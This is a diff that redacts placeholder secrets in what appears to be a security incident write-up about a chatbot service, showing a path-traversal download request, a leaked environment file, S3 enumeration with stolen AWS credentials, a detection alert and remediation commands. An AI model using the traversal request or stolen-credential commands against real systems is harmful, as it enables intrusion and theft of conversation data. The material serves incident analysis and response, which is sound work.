@@ -113,17 +113,17 @@ GET /api/download?file=../../../../var/log/clawdbot/gateway.log
 DATABASE_URL=postgresql://clawdbot_user:REDACTED_DB_PASSWORD@postgres:5432/clawdbot_prod
 
 # API Keys
-ANTHROPIC_API_KEY=ANTHROPIC_API_KEY_EXAMPLE_NOT_REAL
-SLACK_BOT_TOKEN=SLACK_BOT_TOKEN_EXAMPLE_NOT_REAL
-SLACK_APP_TOKEN=SLACK_APP_TOKEN_EXAMPLE_NOT_REAL
+ANTHROPIC_API_KEY=[REDACTED]
+SLACK_BOT_TOKEN=[REDACTED]
+SLACK_APP_TOKEN=[REDACTED]
 
 # Internal Services
-GATEWAY_API_KEY=GATEWAY_API_KEY_EXAMPLE_NOT_REAL
-MCP_SERVER_AUTH_TOKEN=MCP_SERVER_AUTH_TOKEN_EXAMPLE_NOT_REAL
+GATEWAY_API_KEY=[REDACTED]
+MCP_SERVER_AUTH_TOKEN=[REDACTED]
 
 # AWS Credentials (for S3 conversation logs)
-AWS_ACCESS_KEY_ID=AWS_ACCESS_KEY_ID_EXAMPLE_NOT_REAL
-AWS_SECRET_ACCESS_KEY=AWS_SECRET_ACCESS_KEY_EXAMPLE_NOT_REAL
+AWS_ACCESS_KEY_ID=[REDACTED]
+AWS_SECRET_ACCESS_KEY=[REDACTED]
 AWS_REGION=us-east-1
 AWS_S3_BUCKET=clawdbot-conversation-logs-prod
 ```
@@ -195,8 +195,8 @@ Used stolen AWS credentials to access conversation logs in S3.
 **S3 Enumeration:**
 ```bash
 # Configure AWS CLI with stolen credentials
-export AWS_ACCESS_KEY_ID=AWS_ACCESS_KEY_ID_EXAMPLE_NOT_REAL
-export AWS_SECRET_ACCESS_KEY=AWS_SECRET_ACCESS_KEY_EXAMPLE_NOT_REAL
+export AWS_ACCESS_KEY_ID=[REDACTED]
+export AWS_SECRET_ACCESS_KEY=[REDACTED]
 
 # List S3 buckets
 aws s3 ls
@@ -321,7 +321,7 @@ ALERT: InstanceCredentialExfiltration.S3
 Severity: HIGH
 Description: AWS credentials used from non-standard location
 Details:
-  - Credential: AWS_ACCESS_KEY_ID (AWS_ACCESS_KEY_ID_EXAMPLE_NOT_REAL)
+  - Credential: AWS_ACCESS_KEY_ID ([REDACTED])
   - Source IP: 45.134.67.89 (non-AWS IP, Germany)
   - Action: S3 ListBucket, GetObject (bulk download)
   - Unusual: IP never seen before, high volume download
@@ -341,18 +341,18 @@ Details:
 **Immediate Actions:**
 ```bash
 # 1. Rotate AWS credentials (30 seconds)
-aws iam delete-access-key --access-key-id AWS_ACCESS_KEY_ID_EXAMPLE_NOT_REAL
+aws iam delete-access-key --access-key-id [REDACTED]
 aws iam create-access-key --user-name clawdbot-service
 
 # 2. Revoke Anthropic API key (via dashboard)
-# Revoked: ANTHROPIC_API_KEY_EXAMPLE_NOT_REAL
-# New key: sk-ant-api03-xyz789ghi012...
+# Revoked: [REDACTED]
+# New key: [REDACTED]
 
 # 3. Reset database password
-ALTER USER clawdbot_user WITH PASSWORD 'NewSecurePassword!2025';
+ALTER USER clawdbot_user WITH PASSWORD '[REDACTED]';
 
 # 4. Revoke gateway API keys
-DELETE FROM api_keys WHERE key = 'GATEWAY_API_KEY_EXAMPLE_NOT_REAL';
+DELETE FROM api_keys WHERE key = '[REDACTED]';
 
 # 5. Remove backdoor account
 DELETE FROM users WHERE email = 'backdoor@temp-mail.io';
